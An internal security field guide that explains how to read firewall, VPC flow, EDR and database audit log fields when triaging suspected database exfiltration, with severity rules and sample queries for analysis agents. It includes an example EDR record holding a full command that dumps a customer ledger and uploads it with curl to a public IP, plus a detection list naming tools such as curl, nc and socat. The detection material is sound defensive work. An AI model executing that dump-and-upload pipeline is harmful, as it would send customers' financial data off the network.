# SIEM, Firewall, and EDR Log Field Guide

Document owner: Security Data Engineering
Last reviewed: 2026-04-29
Classification: Internal Use Only

## Purpose

This guide explains how to read the fields that appear in SentinelOps demo alerts, firewall logs, VPC flow logs, EDR process telemetry, database audit logs, and live dashboard streams. Use it when an agent needs to convert raw evidence into incident facts. It is especially relevant for alerts about `prod-db-01`, unusual outbound traffic, `pg_dump`, public IP destinations, and confirmed byte counts.

## Common Entity Normalization

Many data sources use different names for the same entity. Normalize them before classification.

- `prod-db-01`, `10.0.1.45`, and `10.42.18.27` are the same database host.
- `fw-egress-01` and `egress-fw-prod-a` refer to the production egress firewall.
- `siem-collector-01` and `otel-sec-prod` refer to security telemetry collection.
- `bastion-01` and `jump-prod-01` refer to the production bastion.
- `svc_finance_api` and `finance-api-prod` may appear as the same application service identity.

If a query returns either IP alias for `prod-db-01`, evidence should be attached to the same incident.

## Firewall Session Fields

Relevant fields:

- `src_ip`: source IP, usually the internal host.
- `src_host`: resolved hostname if available.
- `dest_ip`: destination IP.
- `dest_port`: destination TCP or UDP port.
- `bytes_out`: bytes sent from source to destination.
- `bytes_in`: bytes received by source from destination.
- `app`: firewall application classification.
- `action`: allowed, blocked, reset, or quarantined.
- `rule_id`: firewall rule that allowed or blocked the traffic.
- `start_time` and `end_time`: session boundaries.

Example high-risk record:

`src_ip=10.0.1.45 src_host=prod-db-01 dest_ip=185.220.101.45 dest_port=443 bytes_out=2147483648 app=tls action=allowed rule_id=legacy-atlas-443 start_time=2026-05-09T03:14:02Z`

Interpretation: `prod-db-01` transferred 2 GB to an unapproved public destination over HTTPS. If this is confirmed, severity should be Critical because the source is a restricted database host and the byte count exceeds 1 GB.

## VPC Flow Log Fields

Relevant fields:

- `interface_id`: network interface identifier.
- `srcaddr`: source IP.
- `dstaddr`: destination IP.
- `srcport` and `dstport`: ports.
- `bytes`: total bytes for the aggregation window.
- `action`: ACCEPT or REJECT.
- `log_status`: OK, NODATA, or SKIPDATA.

VPC flow logs do not identify process names or database tables. They prove network movement and volume. Pair them with EDR and database audit logs before making a data exposure statement.

## EDR Process Fields

Relevant fields:

- `hostname`
- `process_name`
- `process_path`
- `command_line`
- `parent_process`
- `user`
- `sha256`
- `network_connection`
- `file_write_path`
- `timestamp`

Suspicious process indicators on database hosts:

- `pg_dump`
- `psql -c "copy ..."`
- `gzip`, `zip`, `tar`, or `openssl enc`
- `curl`, `wget`, `scp`, `rsync`, `nc`, or `socat`
- shell scripts launched from `/tmp`, `/var/tmp`, or `/home/postgres`

Example high-risk EDR record:

`hostname=prod-db-01 user=svc_finance_api process_name=pg_dump command_line="pg_dump finance --table finance.customer_ledger | gzip | curl -X PUT https://185.220.101.45/upload" parent_process=/bin/bash timestamp=2026-05-09T03:13:55Z`

Interpretation: This is direct evidence of database export and upload. Escalate to Critical and preserve the process tree.

## Database Audit Fields

Relevant fields:

- `db_user`
- `client_addr`
- `database`
- `schema`
- `table`
- `statement_type`
- `row_count`
- `timestamp`
- `application_name`

High-risk table names:

- `finance.customer_ledger`
- `billing.payment_tokens`
- `accounts.customer_profile`
- `audit.login_history`

Database audit logs show what data was accessed. They do not prove data left the network by themselves. Pair audit logs with firewall byte counts and EDR processes.

## Severity Interpretation

Use this guide with the database exfiltration playbook:

- Alert only, destination unapproved, database host: High.
- Firewall confirms more than 1 GB outbound from database host: Critical.
- EDR confirms `pg_dump` or bulk export plus network upload: Critical.
- Database audit confirms restricted tables accessed before outbound transfer: Critical.
- Destination is blocked before significant transfer and no restricted data access: may remain High pending investigation.

## Query Examples for Nia

Useful search queries:

- `prod-db-01 firewall bytes_out 185.220.101.45 database exfiltration`
- `10.42.18.27 Atlas subnet VPC flow logs exfiltration`
- `pg_dump finance.customer_ledger EDR process database incident`
- `2GB outbound TCP 443 restricted database host severity`
- `prod-db-01 prior postmortem Atlas subnet`

## Agent Output Requirements

When an agent summarizes evidence, it must include source, timestamp, normalized host, destination, byte count, process, table if known, and confidence. Avoid vague statements such as "logs look bad." Good evidence language: "Firewall session `fw-egress-01` shows `prod-db-01` (`10.0.1.45`) sent 2 GB to `185.220.101.45:443` at 03:14 UTC; this meets Critical severity criteria for restricted database egress."

